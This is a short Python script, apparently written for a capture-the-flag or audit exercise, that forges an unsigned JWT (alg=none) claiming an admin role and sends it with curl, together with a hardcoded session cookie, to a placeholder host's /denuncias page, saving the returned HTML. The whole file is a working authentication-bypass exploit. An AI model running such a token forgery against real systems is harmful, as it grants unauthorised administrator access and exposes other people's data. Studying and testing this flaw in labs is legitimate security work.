#!/usr/bin/env python3
"""Genera un JWT con alg=none y rol admin, y guarda la respuesta del muro."""
import base64
import json
import subprocess

COOKIE = "trama_session=h1VKBwbj5fd2y9kKmlmtHKuvSRvGNPtZ9sJODeI7BpN7otZM5b2ZRaw5H8q-CVcQ"
BASE = "https://<host>"
W = "/mnt/c/Users/<usuario>/OneDrive - dipreca.cl/Agentes IA/AUDITORIA_IA_V2/ctf/blocc/work"


def b64(o) -> str:
    return base64.urlsafe_b64encode(json.dumps(o, separators=(",", ":")).encode()).decode().rstrip("=")


payload = {"user": "admin", "nombre": "Administración", "depto": "ADMIN", "role": "admin"}
tok = f"{b64({'alg': 'none', 'typ': 'JWT'})}.{b64(payload)}."
print("token:", tok)

r = subprocess.run(["curl", "-s", "-m", "20", "-b", f"{COOKIE}; vecino_token={tok}",
                    f"{BASE}/denuncias"], capture_output=True, text=True)
open(f"{W}/admin_denuncias2.html", "w", encoding="utf-8").write(r.stdout)
print("len:", len(r.stdout))
